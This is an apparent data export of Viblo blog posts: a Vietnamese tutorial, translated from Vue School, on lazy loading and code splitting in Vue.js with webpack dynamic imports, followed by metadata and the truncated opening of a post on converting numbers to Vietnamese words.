        "Vi\u1ec7c gi\u1eef cho \u1ee9ng d\u1ee5ng c\u1ee7a b\u1ea1n t\u1ea3i nhanh ng\u00e0y c\u00e0ng kh\u00f3 h\u01a1n. Trong lo\u1ea1t b\u00e0i n\u00e0y, t\u00f4i s\u1ebd \u0111i s\u00e2u v\u00e0o c\u00e1c k\u1ef9 thu\u1eadt t\u1ed1i \u01b0u hi\u1ec7u su\u1ea5t Vue v\u00e0 b\u1ea1n c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng trong c\u00e1c \u1ee9ng d\u1ee5ng Vue.js c\u1ee7a m\u00ecnh \u0111\u1ec3 l\u00e0m cho ch\u00fang t\u1ea3i ng\u00e0y l\u1eadp t\u1ee9c v\u00e0 ho\u1ea1t \u0111\u1ed9ng tr\u01a1n tru h\u01a1n. M\u1ee5c ti\u00eau c\u1ee7a t\u00f4i l\u00e0 l\u00e0m cho lo\u1ea1t b\u00e0i n\u00e0y tr\u1edf th\u00e0nh m\u1ed9t h\u01b0\u1edbng d\u1eabn \u0111\u1ea7y \u0111\u1ee7  v\u00e0 ho\u00e0n ch\u1ec9nh v\u1ec1 hi\u1ec7u su\u1ea5t \u1ee9ng d\u1ee5ng Vue.\n\n\n## C\u00e1ch Webpack \u0111\u00f3ng g\u00f3i(bundling)?\n\nH\u1ea7u h\u1ebft c\u00e1c m\u1eb9o trong lo\u1ea1t b\u00e0i n\u00e0y s\u1ebd t\u1eadp trung v\u00e0o vi\u1ec7c l\u00e0m cho JS bundle(g\u00f3i) c\u1ee7a ch\u00fang ta nh\u1ecf h\u01a1n. \u0110\u1ec3 hi\u1ec3u \u0111i\u1ec1u quan tr\u1ecdng, tr\u01b0\u1edbc ti\u00ean, ch\u00fang ta c\u1ea7n hi\u1ec3u c\u00e1ch Webpack \u0111\u00f3ng g\u00f3i t\u1ea5t c\u1ea3 c\u00e1c t\u1ec7p c\u1ee7a ch\u00fang ta.\n\nTrong khi g\u00f3i assets(th\u01b0 m\u1ee5c ch\u1ee9a css, icon, image c\u1ee7a app) c\u1ee7a ch\u00fang ta, Webpack \u0111ang t\u1ea1o ra m\u1ed9t th\u1ee9 g\u1ecdi l\u00e0 bi\u1ec1u \u0111\u1ed3 ph\u1ee5 thu\u1ed9c([dependency graph](https://cloud.githubusercontent.com/assets/1365881/5745055/40da9236-9c26-11e4-9e2b-6611cd743423.png)). \u0110\u00f3 l\u00e0 bi\u1ec3u \u0111\u1ed3 li\u00ean k\u1ebft t\u1ea5t c\u1ea3 c\u00e1c t\u1ec7p c\u1ee7a ch\u00fang ta d\u1ef1a tr\u00ean c\u00e1c l\u1ea7n import. Gi\u1ea3 s\u1eed ch\u00fang ta c\u00f3 m\u1ed9t file l\u00e0 *main.js* \u0111\u01b0\u1ee3c ch\u1ec9 \u0111\u1ecbnh l\u00e0m *entry point*(\u0111i\u1ec3m v\u00e0o : n\u01a1i \u0111\u01b0\u1ee3c truy c\u1eadp \u0111\u1ea7u ti\u00ean khi ch\u1ea1y app) trong c\u1ea5u h\u00ecnh *webpack* c\u1ee7a ch\u00fang ta, n\u00f3 s\u1ebd l\u00e0 g\u1ed1c c\u1ee7a  bi\u1ec1u \u0111\u1ed3 ph\u1ee5 thu\u1ed9c . B\u00e2y gi\u1edd m\u1ecdi js modunle m\u00e0 ch\u00fang ta s\u1ebd import trong file n\u00e0y s\u1ebd tr\u1edf th\u00e0nh n\u00fat c\u1ee7a n\u00f3 trong bi\u1ec3u \u0111\u1ed3 v\u00e0 m\u1ecdi module \u0111\u01b0\u1ee3c import trong c\u00e1c n\u00fat n\u00e0y s\u1ebd tr\u1edf th\u00e0nh n\u00fat c\u1ee7a ch\u00fang.\n\nWebpack \u0111ang s\u1eed d\u1ee5ng bi\u1ec3u \u0111\u1ed3 ph\u1ee5 thu\u1ed9c n\u00e0y \u0111\u1ec3 ph\u00e1t hi\u1ec7n file n\u00e0o n\u00f3 n\u00ean \u0111\u01b0a v\u00e0o g\u00f3i \u0111\u1ea7u ra(*output bundle*). G\u00f3i \u0111\u1ea7u ra ch\u1ec9 l\u00e0 m\u1ed9t file js duy nh\u1ea5t (ho\u1eb7c nhi\u1ec1u nh\u01b0 ch\u00fang ta s\u1ebd th\u1ea5y trong c\u00e1c ph\u1ea7n sau) ch\u1ee9a t\u1ea5t c\u1ea3 c\u00e1c module t\u1eeb bi\u1ec3u \u0111\u1ed3 ph\u1ee5 thu\u1ed9c.\n\nV\u1ec1 c\u01a1 b\u1ea3n, g\u00f3i n\u00e0y l\u00e0 to\u00e0n b\u1ed9 \u1ee9ng d\u1ee5ng JavaScript c\u1ee7a ch\u00fang ta.\n\nCh\u00fang ta c\u00f3 th\u1ec3 minh h\u1ecda qu\u00e1 tr\u00ecnh n\u00e0y b\u1eb1ng h\u00ecnh \u1ea3nh d\u01b0\u1edbi \u0111\u00e2y:\n\n![](https://images.viblo.asia/df72543a-6013-4464-a096-0fc3a19d1fb9.png)\n\n\nB\u00e2y gi\u1edd ch\u00fang ta \u0111\u00e3 bi\u1ebft c\u00e1ch \u0111\u00f3ng g\u00f3i(budling) c\u1ee7a webpack nh\u01b0 th\u1ebf n\u00e0o, r\u00f5 r\u00e0ng l\u00e0 d\u1ef1 \u00e1n c\u1ee7a ch\u00fang ta c\u00e0ng l\u1edbn th\u00ec g\u00f3i JavaScript ban \u0111\u1ea7u c\u00e0ng l\u1edbn.\n\nG\u00f3i l\u1edbn h\u01a1n, th\u1eddi gian t\u1ea3i xu\u1ed1ng v\u00e0 ph\u00e2n t\u00edch c\u00fa ph\u00e1p cho ng\u01b0\u1eddi d\u00f9ng c\u00e0ng l\u00e2u. Ng\u01b0\u1eddi d\u00f9ng c\u00e0ng ph\u1ea3i \u0111\u1ee3i l\u00e2u th\u00ec kh\u1ea3 n\u0103ng h\u1ecd r\u1eddi kh\u1ecfi trang web c\u1ee7a ch\u00fang ta c\u00e0ng cao. Tr\u00ean th\u1ef1c t\u1ebf, theo Google, 53% ng\u01b0\u1eddi s\u1ee7 d\u1ee5ng di \u0111\u1ed9ng r\u1eddi kh\u1ecfi m\u1ed9t trang m\u1ea5t h\u01a1n 3 gi\u00e2y \u0111\u1ec3 t\u1ea3i.\n\nT\u00f3m l\u1ea1i, **g\u00f3i l\u1edbn h\u01a1n = \u00edt ng\u01b0\u1eddi d\u00f9ng h\u01a1n**(*bigger bundle = fewer users*), \u0111i\u1ec1u n\u00e0y c\u00f3 th\u1ec3 tr\u1ef1c ti\u1ebfp d\u1eabn \u0111\u1ebfn m\u1ea5t doanh thu ti\u1ec1m n\u0103ng. **Bing** l\u00e0 m\u1ed9t v\u00ed d\u1ee5 \u0111i\u1ec3n h\u00ecnh - **2 gi\u00e2y ch\u1eadm tr\u1ec5 khi\u1ebfn h\u1ecd m\u1ea5t 4,3% doanh thu tr\u00ean m\u1ed7i kh\u00e1ch truy c\u1eadp.**\n\n## Lazy loading \n\nV\u1eady l\u00e0m c\u00e1ch n\u00e0o ch\u00fang ta c\u00f3 th\u1ec3 c\u1eaft b\u1edbt k\u00edch th\u01b0\u1edbc g\u00f3i khi ch\u00fang ta v\u1eabn c\u1ea7n th\u00eam c\u00e1c t\u00ednh n\u0103ng m\u1edbi v\u00e0 c\u1ea3i thi\u1ec7n \u1ee9ng d\u1ee5ng c\u1ee7a m\u00ecnh? C\u00e2u tr\u1ea3 l\u1eddi l\u00e0 c\u00f3  - \u200a**lazy loading and code splitting**(t\u1ea3i l\u01b0\u1eddi bi\u1ebfn v\u00e0 t\u00e1ch code)\n\nNh\u01b0 t\u00ean cho th\u1ea5y *lazy loading* l\u00e0 m\u1ed9t qu\u00e1 tr\u00ecnh t\u1ea3i c\u00e1c ph\u1ea7n \u1ee9ng d\u1ee5ng c\u1ee7a b\u1ea1n m\u1ed9t c\u00e1ch l\u01b0\u1eddi bi\u1ebfng(lazily). N\u00f3i c\u00e1ch kh\u00e1c - ch\u1ec9 t\u1ea3i ch\u00fang khi ch\u00fang ta th\u1ef1c s\u1ef1 c\u1ea7n.  *Code splitting* ch\u1ec9 l\u00e0 m\u1ed9t qu\u00e1 tr\u00ecnh t\u00e1ch \u1ee9ng d\u1ee5ng th\u00e0nh c\u00e1c ph\u1ea7n \u0111\u01b0\u1ee3c t\u1ea3i ch\u1eadm r\u00e3i n\u00e0y\n\n![](https://images.viblo.asia/82e96a80-d074-4581-b2be-10259be2df68.png)\n\nTrong h\u1ea7u h\u1ebft c\u00e1c tr\u01b0\u1eddng h\u1ee3p, b\u1ea1n kh\u00f4ng c\u1ea7n t\u1ea5t c\u1ea3 code t\u1eeb g\u00f3i Javascript(javascript bundle) ngay l\u1eadp t\u1ee9c khi ng\u01b0\u1eddi d\u00f9ng truy c\u1eadp trang web c\u1ee7a b\u1ea1n.\n\nV\u00ed d\u1ee5: ch\u00fang ta kh\u00f4ng c\u1ea7n d\u00e0nh c\u00e1c t\u00e0i nguy\u00ean c\u00f3 gi\u00e1 tr\u1ecb \u0111\u1ec3 t\u1ea3i khu v\u1ef1c \u201c*My Page*\u201d cho nh\u1eefng kh\u00e1ch truy c\u1eadp trang web c\u1ee7a ch\u00fang ta l\u1ea7n \u0111\u1ea7u ti\u00ean. Ho\u1eb7c c\u00f3 th\u1ec3 c\u00f3 c\u00e1c modals, tooltips v\u00e0 c\u00e1c b\u1ed9 ph\u1eadn v\u00e0 th\u00e0nh ph\u1ea7n kh\u00e1c kh\u00f4ng c\u1ea7n thi\u1ebft tr\u00ean m\u1ecdi trang.\n\nT\u00ednh n\u0103ng *lazy loading* cho ph\u00e9p ch\u00fang ta chia nh\u1ecf g\u00f3i v\u00e0 ch\u1ec9 ph\u00e2n ph\u00e1t c\u00e1c ph\u1ea7n c\u1ea7n thi\u1ebft \u0111\u1ec3 ng\u01b0\u1eddi d\u00f9ng kh\u00f4ng m\u1ea5t th\u1eddi gian t\u1ea3i xu\u1ed1ng v\u00e0 ph\u00e2n t\u00edch c\u00fa ph\u00e1p code kh\u00f4ng \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng.\n\n\u0110\u1ec3 xem c\u00f3 bao nhi\u00eau m\u00e3 JavaScript th\u1ef1c s\u1ef1 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng trong trang web c\u1ee7a ch\u00fang ta, ch\u00fang ta c\u00f3 th\u1ec3 truy c\u1eadp devtools(F12) -> Coverage -> \u1ea5n icon reload ngay b\u00ean d\u01b0\u1edbi (v\u1edbi chrome) . B\u00e2y gi\u1edd, ch\u00fang ta s\u1ebd c\u00f3 th\u1ec3 th\u1ea5y l\u01b0\u1ee3ng code \u0111\u00e3 t\u1ea3i xu\u1ed1ng v\u00e0 th\u1ef1c s\u1ef1 \u0111\u01b0\u1ee3c s\u1eed d\u1ee5ng.\n\n![](https://images.viblo.asia/136b4f72-f4d9-412d-92c9-3cf6834b2a3c.png)\n\nM\u1ecdi th\u1ee9 \u0111\u01b0\u1ee3c \u0111\u00e1nh d\u1ea5u l\u00e0 m\u00e0u \u0111\u1ecf l\u00e0 th\u1ee9 kh\u00f4ng c\u1ea7n thi\u1ebft tr\u00ean \u0111\u01b0\u1eddng d\u1eabn hi\u1ec7n t\u1ea1i(*current route*) v\u00e0 c\u00f3 th\u1ec3 \u0111\u01b0\u1ee3c t\u1ea3i m\u1ed9t c\u00e1ch l\u01b0\u1eddi bi\u1ebfng(*lazy loaded*). N\u1ebfu b\u1ea1n \u0111ang s\u1eed d\u1ee5ng b\u1ea3n \u0111\u1ed3 ngu\u1ed3n, b\u1ea1n c\u00f3 th\u1ec3 nh\u1ea5p v\u00e0o b\u1ea5t k\u1ef3 file n\u00e0o trong danh s\u00e1ch n\u00e0y v\u00e0 xem ph\u1ea7n n\u00e0o c\u1ee7a file \u0111\u00f3 kh\u00f4ng \u0111\u01b0\u1ee3c s\u1ee7 d\u1ee5ng. Nh\u01b0 ch\u00fang ta c\u00f3 th\u1ec3 th\u1ea5y, ngay c\u1ea3 vuejs.org c\u0169ng c\u00f3 r\u1ea5t nhi\u1ec1u \u0111i\u1ec3m \u0111\u1ec3 c\u1ea3i thi\u1ec7n.\n\nB\u1eb1ng c\u00e1ch t\u1ea3i l\u01b0\u1eddi bi\u1ebfn(*lazy loading*) c\u00e1c th\u00e0nh ph\u1ea7n v\u00e0 th\u01b0 vi\u1ec7n th\u00edch h\u1ee3p, \u0111\u00e2y c\u00f3 l\u1ebd l\u00e0 c\u00e1ch d\u1ec5 nh\u1ea5t \u0111\u1ec3 t\u0103ng hi\u1ec7u su\u1ea5t.\n\nOk, ch\u00fang ta \u0111\u00e3 bi\u1ebft *lazy loading* l\u00e0 g\u00ec v\u00e0 n\u00f3 h\u1eefu \u00edch ra sao. B\u1ea1n h\u00e3y s\u1eed d\u1ee5ng trong Vue app c\u1ee7a m\u00ecnh nh\u00e9 :smile_cat:\n\n## Dynamic Import(import \u0111\u1ed9ng)\nCh\u00fang ta c\u00f3 th\u1ec3 d\u1ec5 d\u00e0ng t\u1ea3i m\u1ed9t s\u1ed1 ph\u1ea7n c\u1ee7a \u00fang d\u1ee5ng m\u1ed9t c\u00e1ch l\u01b0\u1eddi bi\u1ebfn(*lazily*) v\u1edbi [wepack dynamic imports](https://webpack.js.org/guides/code-splitting/#dynamic-imports). H\u00e3y nh\u00ecn xem c\u00e1ch ch\u00fang ho\u1ea1t \u0111\u1ed9ng v\u00e0 ch\u00fang kh\u00e1c v\u1edbi c\u00e1ch import th\u00f4ng th\u01b0\u1eddng(*regular imports*) nh\u01b0 th\u1ebf n\u00e0o.\n\nN\u1ebfu ch\u00fang ta import m\u1ed9t module js v\u1edbi c\u00e1ch chu\u1ea9n nh\u01b0 th\u1ebf n\u00e0y :\n\n```js\n// cat.js\nconst Cat = {\n  meow: function () {\n    console.log(\"Meowwwww!\")\n  }\n}\nexport default Cat\n\n// main.js\nimport Cat from './cat.js'\nCat.meow()\n```\n\nN\u00f3 s\u1ebd \u0111\u01b0\u1ee3c th\u00eam v\u00e0o d\u01b0\u1edbi d\u1ea1ng m\u1ed9t n\u00fat c\u1ee7a *main.js* trong bi\u1ec3u \u0111\u1ed3 ph\u1ee5 thu\u1ed9c v\u00e0 \u0111\u00e3 \u0111\u01b0\u1ee3c \u0111\u00f3ng g\u00f3i(*bundled*).\n\nNh\u01b0ng \u0111i\u1ec1u g\u00ec s\u1ebd x\u1ea3y ra n\u1ebfu ch\u00fang ta ch\u1ec9 c\u1ea7n module **Cat** c\u1ee7a m\u00ecnh trong m\u1ed9t s\u1ed1 tr\u01b0\u1eddng h\u1ee3p nh\u1ea5t \u0111\u1ecbnh nh\u01b0 ph\u1ea3n h\u1ed3i \u0111\u1ed1i v\u1edbi t\u01b0\u01a1ng t\u00e1c c\u1ee7a ng\u01b0\u1eddi d\u00f9ng? G\u00f3i module n\u00e0y v\u1edbi g\u00f3i ban \u0111\u1ea7u(*initial bundle*) c\u1ee7a ch\u00fang ta l\u00e0 m\u1ed9t \u00fd t\u01b0\u1edfng t\u1ed3i v\u00ec n\u00f3 kh\u00f4ng c\u1ea7n thi\u1ebft m\u1ecdi l\u00fac. Ch\u00fang ta c\u1ea7n m\u1ed9t c\u00e1ch \u0111\u1ec3 th\u00f4ng b\u00e1o cho \u1ee9ng d\u1ee5ng c\u1ee7a m\u00ecnh khi n\u00e0o n\u00f3 s\u1ebd t\u1ea3i xu\u1ed1ng \u0111o\u1ea1n code n\u00e0y.\n\n\u0110\u00e2y l\u00e0 l\u00fac *dynamic imports* c\u00f3 th\u1ec3 gi\u00fap ch\u00fang ta! H\u00e3y xem v\u00ed d\u1ee5 n\u00e0y:\n\n```js\n// main.js\nconst getCat = () => import('./cat.js')\n// later in the code as a response to some user interaction like click or route change\ngetCat()\n  .then({ meow } => meow())\n```\n\nH\u00e3y xem nhanh nh\u1eefng g\u00ec \u0111\u00e3 x\u1ea3y ra \u1edf \u0111\u00e2y:\n\nThay v\u00ec *import*  tr\u1ef1c ti\u1ebfp module **Cat**, ch\u00fang ta \u0111\u00e3 t\u1ea1o m\u1ed9t h\u00e0m tr\u1ea3 v\u1ec1 h\u00e0m *import ()*. **B\u00e2y gi\u1edd webpack s\u1ebd \u0111\u00f3ng g\u00f3i(*bundle*) n\u1ed9i dung c\u1ee7a module \u0111\u01b0\u1ee3c import \u0111\u1ed9ng v\u00e0o m\u1ed9t file ri\u00eang bi\u1ec7t**. H\u00e0m \u0111\u1ea1i di\u1ec7n cho module \u0111\u01b0\u1ee3c import \u0111\u1ed9ng  tr\u1ea3 v\u1ec1 m\u1ed9t *Promise* s\u1ebd cung c\u1ea5p cho ch\u00fang ta quy\u1ec1n truy c\u1eadp v\u00e0o c\u00e1c th\u00e0nh vi\u00ean \u0111\u01b0\u1ee3c *export* c\u1ee7a *module* khi *resolved*.\n\nSau \u0111\u00f3, ch\u00fang ta c\u00f3 th\u1ec3 t\u1ea3i xu\u1ed1ng \u0111o\u1ea1n t\u00f9y ch\u1ecdn n\u00e0y sau, khi c\u1ea7n. V\u00ed d\u1ee5: ph\u1ea3n h\u1ed3i cho m\u1ed9t t\u01b0\u01a1ng t\u00e1c ng\u01b0\u1eddi d\u00f9ng nh\u1ea5t \u0111\u1ecbnh (nh\u01b0 route change hay click chu\u1ed9t).\n\nB\u1eb1ng c\u00e1ch th\u1ef1c hi\u1ec7n import \u0111\u1ed9ng, v\u1ec1 c\u01a1 b\u1ea3n, ch\u00fang ta \u0111ang c\u00f4 l\u1eadp n\u00fat \u0111\u00e3 cho (trong tr\u01b0\u1eddng h\u1ee3p \u0111\u00f3 l\u00e0 **Cat**) s\u1ebd \u0111\u01b0\u1ee3c th\u00eam v\u00e0o bi\u1ec3u \u0111\u1ed3 ph\u1ee5 thu\u1ed9c v\u00e0 t\u1ea3i xu\u1ed1ng ph\u1ea7n n\u00e0y khi ch\u00fang ta quy\u1ebft \u0111\u1ecbnh n\u00f3 c\u1ea7n thi\u1ebft (ch\u00fang ta c\u0169ng \u0111ang c\u1eaft b\u1ecf c\u00e1c module \u0111\u01b0\u1ee3c import b\u00ean trong **Cat.js**).\n\nH\u00e3y xem m\u1ed9t v\u00ed d\u1ee5 kh\u00e1c s\u1ebd minh h\u1ecda r\u00f5 h\u01a1n c\u01a1 ch\u1ebf n\u00e0y.\n\nGi\u1ea3 s\u1eed ch\u00fang ta c\u00f3 m\u1ed9t c\u1eeda h\u00e0ng tr\u1ef1c tuy\u1ebfn r\u1ea5t nh\u1ecf v\u1edbi 4 files:\n\n*  *main.js*: g\u00f3i ch\u00ednh (main bundle).\n*  *product.js*:  ch\u1ee9a scripts c\u1ee7a trang product.\n*  *productGallery.js*: ch\u1ee9a scripts c\u1ee7a trang product page.\n*   *category.js*: ch\u1ee9a scripts c\u1ee7a trang category.\n\nKh\u00f4ng c\u1ea7n \u0111i s\u00e2u v\u00e0o chi ti\u1ebft, h\u00e3y xem c\u00e1ch c\u00e1c file \u0111\u00f3 \u0111\u01b0\u1ee3c ph\u00e2n ph\u1ed1i tr\u00ean \u1ee9ng d\u1ee5ng:\n\n```js\n// category.js\nconst category = {\n  init () { ... }\n}\nexport default category\n\n// product.js\nimport gallery from ('./productGallery.js')\n\nconst product = {\n  init () { ... }\n}\nexport default product\n\n// main.js\nconst getProduct = () => import('./product.js')\nconst getCategory = () => import('./category.js')\n\nif (route === \"/product\") {\n  getProduct()\n    .then({init} => init()) // run scripts for product page\n}\nif (route === \"/category\") {\n  getCategory()\n    .then({init} => init()) // run scripts for category page\n}\n```\n\nTrong \u0111o\u1ea1n code tr\u00ean, t\u00f9y thu\u1ed9c v\u00e0o \u0111\u01b0\u1eddng d\u1eabn hi\u1ec7n t\u1ea1i(*current route*), ch\u00fang ta \u0111ang *import \u0111\u1ed9ng*  module *product* ho\u1eb7c *category* v\u00e0 sau \u0111\u00f3 ch\u1ea1y h\u00e0m *init* \u0111\u01b0\u1ee3c *export* b\u1edfi c\u1ea3 hai.\n\nKhi bi\u1ebft c\u00e1ch *import \u0111\u1ed9ng*(dynamic import) ho\u1ea1t \u0111\u1ed9ng, ch\u00fang ta bi\u1ebft r\u1eb1ng *product* v\u00e0 *category* s\u1ebd k\u1ebft th\u00fac trong m\u1ed9t g\u00f3i ri\u00eang bi\u1ec7t(separate bundles) nh\u01b0ng \u0111i\u1ec1u g\u00ec s\u1ebd x\u1ea3y ra v\u1edbi module *productGallery* kh\u00f4ng \u0111\u01b0\u1ee3c import \u0111\u1ed9ng? Nh\u01b0 ch\u00fang ta \u0111\u00e3 bi\u1ebft c\u00e1ch import \u0111\u1ed9ng module l\u00e0 \u0111ang c\u1eaft m\u1ed9t ph\u1ea7n c\u1ee7a bi\u1ec3u \u0111\u1ed3 ph\u1ee5 thu\u1ed9c. M\u1ecdi th\u1ee9 \u0111\u01b0\u1ee3c import v\u00e0o b\u00ean trong ph\u1ea7n n\u00e0y s\u1ebd \u0111\u01b0\u1ee3c nh\u00f3m l\u1ea1i v\u1edbi nhau \u0111\u1ec3 *productGallery* c\u00f9ng \u0111\u01b0\u1ee3c \u0111\u00f3ng g\u00f3i v\u1edbi module *product*.\n\nN\u00f3i c\u00e1ch kh\u00e1c, ch\u00fang ta ch\u1ec9 \u0111ang t\u1ea1o ra m\u1ed9t s\u1ed1 lo\u1ea1i *entry point* m\u1edbi cho bi\u1ec3u \u0111\u1ed3 ph\u1ee5 thu\u1ed9c.\n\n![](https://images.viblo.asia/fc2f8e3b-c441-423f-9416-e63f9efdf036.png)\n\n\n## Lazy loading Vue components\n\nB\u00e2y gi\u1edd ch\u00fang ta \u0111\u00e3 bi\u1ebft lazy loading l\u00e0 g\u00ec v\u00e0 t\u1ea1i sao ch\u00fang ta c\u1ea7n n\u00f3. \u0110\u00e3 \u0111\u1ebfn l\u00fac xem ch\u00fang ta c\u00f3 th\u1ec3 s\u1eed d\u1ee5ng n\u00f3 nh\u01b0 th\u1ebf n\u00e0o trong c\u00e1c \u1ee9ng d\u1ee5ng Vue c\u1ee7a m\u00ecnh.\n\nTVi\u1ec7c n\u00e0y c\u1ef1c k\u1ef3 d\u1ec5 d\u00e0ng v\u00e0 ch\u00fang ta c\u00f3 th\u1ec3 t\u1ea3i to\u00e0n b\u1ed9 *Single Page Component* m\u1ed9t c\u00e1ch l\u01b0\u1eddi bi\u1ebfng(*lazily*), v\u1edbi CSS v\u00e0 HTML c\u1ee7a n\u00f3 v\u1edbi c\u00f9ng m\u1ed9t c\u00fa ph\u00e1p nh\u01b0 tr\u01b0\u1edbc \u0111\u00e2y!\n\n```js\nconst lazyComponent = () => import('Component.vue')\n```\n\n\u2026\u0111\u00f3 l\u00e0 t\u1ea5t c\u1ea3 nh\u1eefng g\u00ec b\u1ea1n c\u1ea7n! Gi\u1edd \u0111\u00e2y, *Component* s\u1ebd ch\u1ec9 \u0111\u01b0\u1ee3c t\u1ea3i xu\u1ed1ng khi \u0111\u01b0\u1ee3c y\u00eau c\u1ea7u. D\u01b0\u1edbi \u0111\u00e2y l\u00e0 nh\u1eefng c\u00e1ch ph\u1ed5 bi\u1ebfn nh\u1ea5t \u0111\u1ec3 g\u1ecdi *dynamic loading* c\u1ee7a Vue component:\n\n* G\u1ecdi h\u00e0m \u0111\u01b0\u1ee3c import:\n\n```js\nconst lazyComponent = () => import('Component.vue')\nlazyComponent()\n```\n\n* Component \u0111\u01b0\u1ee3c y\u00eau c\u1ea7u \u0111\u1ec3 render :\n\n```js\n<template>\n  <div> \n    <lazy-component />\n  </div>\n</template>\n\n<script>\nconst lazyComponent = () => import('Component.vue')\nexport default {\n  components: { lazyComponent }\n}\n\n// Another syntax\nexport default {\n  components: {\n    lazyComponent: () => import('Component.vue')\n  }\n}\n</script>\n```\n\nXin l\u01b0u \u00fd r\u1eb1ng vi\u1ec7c g\u1ecdi h\u00e0m *lazyComponent* s\u1ebd ch\u1ec9 x\u1ea3y ra khi th\u00e0nh ph\u1ea7n \u0111\u01b0\u1ee3c y\u00eau c\u1ea7u hi\u1ec3n th\u1ecb trong m\u1ed9t template. V\u00ed d\u1ee5:\n\n```js\n<lazy-component v-if=\"false\" /> \n```\n\nComponent s\u1ebd kh\u00f4ng \u0111\u01b0\u1ee3c t\u1ea3i cho \u0111\u1ebfn khi n\u00f3 \u0111\u01b0\u1ee3c y\u00eau c\u1ea7u trong DOM, ngay sau khi gi\u00e1 tr\u1ecb *v-if* thay \u0111\u1ed5i th\u00e0nh *true*.\n\nThank you for watching, \u0111\u00f3n xem c\u00e1c ph\u1ea7n ti\u1ebfp theo nh\u00e9.\nD\u1ecbch t\u1eeb [vueschool](https://vueschool.io/articles/vuejs-tutorials/lazy-loading-and-code-splitting-in-vue-js/)",
      published_at: "2021-02-22 08:42:11",
      is_published: true,
      is_shared: false,
      updated_at: "2021-03-17 16:00:12",
      translation_source: null,
      trend_at: null,
      promoted_at: null,
      reading_time: 11,
      points: 0,
      views_count: 113,
      clips_count: 1,
      comments_count: 0,
      rated_value: null,
      promoted: false,
      trending: false,
      is_draft: false,
      is_public: true,
      locale_code: "vi",
      is_video: false,
      thumbnail_url:
        "https://images.viblo.asia/df72543a-6013-4464-a096-0fc3a19d1fb9.png",
      user: {
        data: {
          id: 28887,
          url: "https://viblo.asia/u/tan",
          avatar: "c72b087d-b226-46e0-8d09-2eb48a400299.jpg",
          name: "phanvan",
          username: "tan",
          followers_count: 1,
          reputation: 139,
          posts_count: 18,
          banned_at: null,
          following: false,
        },
      },
      tags: {
        data: [
          {
            slug: "javascript",
            name: "JavaScript",
            primary: false,
            image:
              "https://placehold.jp/16/f39c12/ffffff/80x80.jpg?text=JavaScript&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "vuejs",
            name: "VueJS",
            primary: false,
            image:
              "https://placehold.jp/16/27ae60/ffffff/80x80.jpg?text=VueJS&css=%7B%22padding%22%3A%223px%22%7D",
          },
          {
            slug: "happy-new-year",
            name: "Happy New Year",
            primary: false,
            image:
              "https://placehold.jp/16/2980b9/ffffff/80x80.jpg?text=Happy+New+Year&css=%7B%22padding%22%3A%223px%22%7D",
          },
        ],
      },
      commentators: {
        data: [],
      },
    },
    {
      id: 50875,
      title:
        "B\u00e0i to\u00e1n \u0111\u1ecdc s\u1ed1 th\u00e0nh ch\u1eef (ph\u1ea7n 1) - Ph\u00e2n t\u00edch \u0111\u1ec1 v\u00e0 nh\u1eefng m\u1ea3nh gh\u00e9p \u0111\u1ea7u ti\u00ean",
      slug: "6J3Zg0OBlmB",
      url:
        "https://viblo.asia/p/bai-toan-doc-so-thanh-chu-phan-1-phan-tich-de-va-nhung-manh-ghep-dau-tien-6J3Zg0OBlmB",
      user_id: 44447,
      moderation: null,
      transliterated:
        "bai-toan-doc-so-thanh-chu-phan-1-phan-tich-de-va-nhung-manh-ghep-dau-tien",
      contents_short:
        "Kho\u1ea3ng th\u00e1ng tr\u01b0\u1edbc b\u00ean m\u00ecnh c\u00f3 m\u1ed9t challenge vi\u1ebft code \u0111\u1ecdc s\u1ed1 th\u00e0nh ch\u1eef, n\u00ean h\u00f4m nay m\u00ecnh s\u1ebd chia s\u1ebb \u0111\u1ebfn m\u1ecdi ng\u01b0\u1eddi c\u00e1ch m\u00ecnh \u0111\u00e3 th\u1ef1c hi\u1ec7n nh\u01b0 th\u1ebf n\u00e0o. T\u1ea5t nhi\u00ean l\u00e0 m\u00ecnh c\u0169ng s\u1ebd tr\u00ecnh b\u00e0y, ph\u00e2n t\u00edch...",
      contents:
        "Kho\u1ea3ng th\u00e1ng tr\u01b0\u1edbc b\u00ean m\u00ecnh c\u00f3 m\u1ed9t challenge vi\u1ebft code \u0111\u1ecdc s\u1ed1 th\u00e0nh ch\u1eef, n\u00ean h\u00f4m nay m\u00ecnh s\u1ebd chia s\u1ebb \u0111\u1ebfn m\u1ecdi ng\u01b0\u1eddi c\u00e1ch m\u00ecnh \u0111\u00e3 th\u1ef1c hi\u1ec7n nh\u01b0 th\u1ebf n\u00e0o. T\u1ea5t nhi\u00ean l\u00e0 m\u00ecnh c\u0169ng s\u1ebd tr\u00ecnh b\u00e0y, ph\u00e2n t\u00edch **step by step** ch\u1ee9 kh\u00f4ng ph\u1ea3i v\u00e0o code v\u00e0o ngay.\n\n![](https://images.viblo.asia/949625ed-df7a-4022-85e0-082fbbc335c8.jpg)\n\nB\u00e0i vi\u1ebft kh\u00e1 d\u00e0i n\u00ean m\u00ecnh chia ra 2 ph\u1ea7n nh\u00e9. V\u00e0 b\u00e0i h\u00f4m nay l\u00e0 ph\u1ea7n \u0111\u1ea7u ti\u00ean - ph\u00e2n t\u00edch \u0111\u1ec1 v\u00e0 t\u00ecm h\u01b0\u1edbng gi\u1ea3i. Ok b\u1eaft \u0111\u1ea7u th\u00f4i.\n\n## 1. Ph\u00e2n t\u00edch b\u00e0i to\u00e1n\n\n### 1.1. B\u00e0i to\u00e1n\n\n> Cho m\u1ed9t s\u1ed1 nguy\u00ean d\u01b0\u01a1ng N b\u1ea5t k\u00ec, t\u00ecm c\u00e1ch \u0111\u1ecdc s\u1ed1 \u0111\u00f3 (th\u00e0nh chu\u1ed7i) trong ti\u1ebfng Vi\u1ec7t.\n> \n> V\u00ed d\u1ee5 m\u1eabu:\n> \n> * 100 = m\u1ed9t tr\u0103m\n> * 104 = m\u1ed9t tr\u0103m l\u1ebb b\u1ed1n\n> * 13 = m\u01b0\u1eddi ba\n> * ...\n\nOk nghe qua th\u00ec c\u00f3 v\u1ebb m\u1ec7t \u0111\u1ea5y, \u0111\u00fang th\u1eadt b\u00e0i n\u00e0y \u0111\u00e3 ng\u1ed1n h\u1ebft c\u1ee7a m\u00ecnh g\u1ea7n 2 ng\u00e0y \u0111\u1ec3 suy ngh\u0129 v\u00e0 vi\u1ebft code.\n\n### 1.2. T\u00ecm 